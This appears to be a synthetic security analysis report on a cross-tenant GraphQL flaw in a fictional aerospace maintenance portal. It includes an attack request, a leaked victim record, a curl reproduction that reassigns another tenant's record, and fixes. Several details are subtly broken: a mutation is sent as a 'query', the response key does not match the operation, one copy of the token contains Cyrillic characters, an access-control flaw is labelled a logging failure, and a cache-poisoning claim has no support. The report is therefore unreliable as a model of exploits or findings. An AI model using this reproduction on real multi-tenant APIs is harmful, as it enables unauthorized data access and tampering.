# Security Analysis Report
**System:** WingTech Maintenance Portal
**Domain:** Aerospace / MRO
**Example ID:** GQL-0326
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | Logging Failures — Pattern 7.1 | Operational PII/PHI leakage via `updateResource` — cross-tenant mutation on aerospace maintenance record `R-2326` leaks `sensitiveField` and `internalNotes` of MRO records in operational response |

---

## Finding 1 — Logging Failures: Operational PII/PHI Leakage (Pattern 7.1)

### Summary
The `updateResource` mutation on WingTech Maintenance Portal (`api.wingtech-maintenance.example.com`) leaks sensitive operational data belonging to `tenant-1596` in the mutation response body. Per §5.0 Pattern 7.1, the resolver's failure to enforce tenancy boundaries at the mutation level causes operational PII/sensitive field data to be returned cross-tenant in the mutation response — the attacker with `tenant-4e69` credentials targets record `R-2326` and receives `sensitiveField` and `internalNotes` from `tenant-1596` in the response.

**Context.txt inconsistency (documented):** HAR mutation uses `updateResource(id: "R-2326", ...)`, but the response JSON key is `getResource`. These conflict. The HAR (§6.0) is the primary evidence — `updateResource` is the authoritative affected operation.

**Redis cache vulnerability:** Cache is keyed by `resourceId` only (no tenant dimension), enabling cross-tenant cache poisoning of MRO records.

**Pattern:** 7.1 — Operational PII/PHI leakage (Logging Failures)
**Affected resolver:** `updateResource`
**Affected endpoint:** `POST https://api.wingtech-maintenance.example.com/graphql`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://api.wingtech-maintenance.example.com/graphql
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ифQ.SIG
Content-Type: application/json
x-tenant-id: tenant-4e69

{"query": "query VulnerableOp { updateResource(id: \"R-2326\", input: {status: \"approved\", ownerId: \"attacker-4e691596\"}) { resourceId status } }"}
```
Note: `x-request-id` is a **server-assigned response header**, not a request header.

**Response — Victim MRO Record Leaked in Response (cross-tenant)**
```json
{
  "data": {
    "getResource": {
      "tenantId": "tenant-1596",
      "ownerId": "other-user-4e691596",
      "data": {
        "sensitiveField": "CONFIDENTIAL-4e691596",
        "internalNotes": "Internal data exposed"
      }
    }
  }
}
```
Attacker token: `tenant-4e69`. Leaked data belongs to: `tenant-1596`. Operational data of victim MRO record exposed in mutation response.

**Context.txt inconsistency:** HAR sends `updateResource` mutation; response body uses key `getResource`. HAR operation is authoritative.

### Steps to Reproduce
```bash
curl -s -X POST "https://api.wingtech-maintenance.example.com/graphql" \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-4e69" \
  -d '{"query": "query VulnerableOp { updateResource(id: \"R-2326\", input: {status: \"approved\", ownerId: \"attacker-4e691596\"}) { resourceId status } }"}'
# Vulnerable: response leaks tenant-1596 sensitiveField and internalNotes — cross-tenant data leaked
# Secure: {"errors": [{"message": "Forbidden — tenant mismatch"}]}
```

### Remediation
1. In `updateResource` resolver: after fetching the record, verify `record.tenantId` matches `jwt.tenantId` before executing mutation.
2. Audit mutation response projections — do not return `sensitiveField`/`internalNotes` in mutation responses unless explicitly required.
3. Re-key Redis cache to include `tenantId`.
